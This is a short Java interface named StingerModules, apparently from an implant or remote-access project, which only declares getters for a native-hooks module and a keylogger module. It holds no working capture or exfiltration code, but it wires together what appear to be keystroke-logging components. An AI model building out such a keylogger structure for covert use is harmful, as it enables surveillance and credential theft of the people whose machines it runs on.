package stinger;

import stinger.os.keylogger.KeyloggerModule;
import stinger.os.nhooks.NativeHooksModule;

public interface StingerModules {

    NativeHooksModule getNativeHooks();
    KeyloggerModule getKeylogger();
}
